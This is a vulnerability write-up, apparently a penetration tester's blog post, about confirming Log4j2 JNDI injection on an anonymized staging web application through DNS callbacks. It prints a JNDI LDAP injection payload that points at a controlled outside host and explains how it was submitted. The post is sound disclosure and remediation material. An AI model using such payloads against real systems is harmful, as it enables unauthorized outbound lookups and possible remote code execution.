---
layout: post
title: "Log4j JNDI Injection in a Staging Web Application"
author: snapsec
categories: [VAPT]
image: assets/images/23/LOG4j-image.png
---

## Introduction

During security testing of a staging web application, a potential **Remote Code Execution (RCE)** vulnerability associated with the **Log4j2** Java logging library was identified.

The affected environment was a staging web application, and the issue involved **Server-Side Injection > Remote Code Execution (RCE)**.

The application processed a specially crafted JNDI LDAP payload and generated an outbound DNS request to controlled infrastructure.

> **Disclosure Note:** The identity of the affected organization, product name, domains, tenant information, and infrastructure-specific identifiers have been intentionally removed from this write-up. The purpose is to document the technical finding without exposing company-specific infrastructure. The screenshots should also be sanitized before publication.

## The Vulnerability

The issue involved the **Log4j2 Java logging library** and its handling of JNDI references.

During testing, the application was found to process a specially crafted JNDI LDAP reference.

A controlled DNS subdomain was used to determine whether the application would initiate an external lookup when processing the supplied payload.

The observed DNS callback demonstrated that the supplied JNDI reference was being processed by the application's logging infrastructure.

## Reproduction

A unique subdomain was generated using a DNS monitoring service.

The generated subdomain was then incorporated into the following JNDI payload:

```text
${jndi:ldap://<controlled-subdomain>/a}
```

For this sanitized write-up, the original DNSLog domain has been replaced with a generic controlled subdomain.

The payload was then submitted through an application feature that generated a server-side log entry.

### Image 1

![Image 1](/assets/images/log4j1.png)

The screenshot shows the controlled DNS subdomain and the JNDI payload submitted to the application.

## DNS Request

After submitting the payload, the DNS monitoring service was checked for incoming requests.

A DNS request associated with the generated subdomain was observed.

This demonstrated that the application had processed the supplied JNDI reference and initiated an outbound DNS lookup.

### Image 2

![Image 2](/assets/images/log4j2.png)

The screenshot shows the DNS monitoring page during the verification process.

## Observed DNS Requests

Multiple DNS requests associated with the generated controlled subdomain were subsequently observed.

The requests demonstrated that the supplied JNDI payload was being processed by the application and that the application was making an external DNS request as a result.

### Image 3

![Image 3](/assets/images/log4j3.png)

The screenshot shows the DNS requests received for the controlled subdomain.

## Technical Flow

The observed behavior can be summarized as:

```text
Controlled Test Input
          ↓
JNDI LDAP Payload
          ↓
Application Processes Input
          ↓
Log4j2 Processes JNDI Reference
          ↓
Outbound DNS Request
          ↓
Controlled DNS Server
```

The DNS callback demonstrated that the supplied JNDI reference was processed and resulted in an outbound DNS request.

## Result

The successful DNS callback demonstrated that the application was processing the crafted JNDI payload through the Log4j2 logging component.

This behavior was consistent with the **Log4j2 JNDI injection vulnerability**.

The observed callback confirmed the JNDI lookup behavior. However, a DNS callback alone does not independently demonstrate arbitrary code execution. Therefore, the demonstrated result is described as confirmation of vulnerable JNDI processing rather than proof of full RCE.

## Severity

The issue falls under:

- **Category:** Web App
- **Vulnerability:** Server-Side Injection > Remote Code Execution (RCE)
- **Component:** Log4j2
- **Environment:** Staging Web Application
- **Priority:** P1

## Key Takeaway

The application processed a specially crafted JNDI LDAP payload and generated an outbound DNS request to controlled infrastructure.

The callback demonstrated that the supplied JNDI reference was being processed by the application's logging functionality.

This demonstrates the security impact that vulnerable Log4j2 deployments can introduce when untrusted input reaches the affected logging component.

The finding highlights the importance of identifying vulnerable Log4j2 deployments, keeping affected components patched, and preventing untrusted input from reaching vulnerable JNDI functionality.

## Responsible Disclosure and Sanitization

This write-up intentionally does not disclose the original company's name, real domain, tenant identifiers, or other environment-specific information.

These details have been removed to prevent unnecessary disclosure of the affected organization's identity and infrastructure.

Before publication, the accompanying screenshots should also be reviewed and sanitized.

Any company names, real domains, IP addresses, tenant identifiers, usernames, timestamps, or other identifying information should be blurred or removed where necessary.

## Conclusion

Security testing of a staging web application identified Log4j2 JNDI processing through a specially crafted LDAP payload.

A controlled DNS subdomain was used to monitor for outbound requests, and DNS callbacks were observed after the payload was processed.

This provided evidence that the application was processing the supplied JNDI reference through its logging infrastructure.

The finding highlights the importance of identifying vulnerable Log4j2 deployments, keeping affected components patched, and preventing untrusted input from reaching vulnerable JNDI functionality.
